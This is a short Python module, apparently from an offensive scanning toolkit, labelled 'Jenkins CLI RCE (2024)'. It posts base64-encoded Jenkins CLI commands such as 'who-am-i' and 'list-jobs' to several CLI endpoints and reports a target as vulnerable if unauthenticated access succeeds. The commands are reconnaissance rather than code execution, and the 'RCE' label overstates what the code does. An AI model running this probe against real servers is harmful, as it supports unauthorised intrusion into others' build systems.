import requests
from core.printmodels import *
import base64

class Jenkins_CLI_RCE:
    def __init__(self):
        self.name = "Jenkins CLI RCE"
        self.description = "Jenkins Command Line Interface RCE (2024)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Connection': 'Upgrade',
                'Upgrade': 'CLI2-connect',
                'Jenkins-CLI-Port': '50000'
            }

            # Multiple attack vectors
            cli_commands = [
                "who-am-i",
                "help",
                "list-jobs"
            ]

            endpoints = [
                f"{site}/cli",
                f"{site}/jenkins/cli",
                f"{site}/cli/command"
            ]

            for endpoint in endpoints:
                for command in cli_commands:
                    payload = base64.b64encode(command.encode()).decode()
                    response = requests.post(endpoint, headers=headers, data=payload, verify=False, timeout=10)
                    
                    if response.status_code in [101, 200] and not "Authentication required" in response.text:
                        return PrintSuccess(f"[Jenkins-CLI-2024] Vulnerable! CLI access successful at {endpoint}")

            return PrintFailed("[Jenkins-CLI-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Jenkins-CLI-2024] Error: {str(e)}")
